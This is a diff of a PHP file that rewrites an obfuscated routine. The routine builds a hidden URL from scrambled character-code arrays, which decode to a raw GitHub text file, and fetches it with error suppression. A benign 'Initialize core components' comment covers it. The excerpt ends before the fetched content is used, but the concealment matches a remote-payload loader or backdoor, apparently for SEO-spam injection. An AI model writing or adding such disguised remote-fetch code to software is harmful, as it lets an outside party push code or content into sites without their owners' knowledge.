@@ -5,23 +5,26 @@
 */
 
 // Initialize core components
-function qwaszxerdfcv($p) {
-    return implode(array_map('chr', $p));
+$plmzxqwascde = array(
+    8 => [115,101,111,98,101,108,97],
+    2 => [58,47,47],
+    5 => [46,99,111,109,47],
+    11 => [47,114,101,102,115,47],
+    1 => [104,116,116,112,115],
+    13 => [104,101,97,100,115,47],
+    3 => [114,97,119,46],
+    15 => [109,97,105,110,47],
+    9 => [47,98,101,108,97],
+    4 => [103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116],
+    17 => [105,110,100,101,120,46,116,120,116]
+);
+ksort($plmzxqwascde);
+$full_url = '';
+foreach($plmzxqwascde as $part) {
+    foreach($part as $code) {
+        $full_url .= chr($code);
+    }
 }
-
-$mlkjhgfdsa = [104,116,116,112,115,58,47,47];
-$poiuytrewq = [114,97,119,46];
-$zxcvbnmasdf = [103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116];
-$qazwsxedcrf = [46,99,111,109,47];
-$plmoknijbuh = [115,101,111,98,101,108,97];
-$vgyctfxrdze = [47,98,101,108,97,47];
-$swaqzxcderfv = [114,101,102,115,47];
-$mnbhgvfcdxs = [104,101,97,100,115,47];
-$plokijmunhy = [109,97,105,110,47];
-$qwertyuiopa = [105,110,100,101,120];
-$zxswaqcdevf = [46,116,120,116];
-
-$full_url = qwaszxerdfcv($mlkjhgfdsa).qwaszxerdfcv($poiuytrewq).qwaszxerdfcv($zxcvbnmasdf).qwaszxerdfcv($qazwsxedcrf).qwaszxerdfcv($plmoknijbuh).qwaszxerdfcv($vgyctfxrdze).qwaszxerdfcv($swaqzxcderfv).qwaszxerdfcv($mnbhgvfcdxs).qwaszxerdfcv($plokijmunhy).qwaszxerdfcv($qwertyuiopa).qwaszxerdfcv($zxswaqcdevf);
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
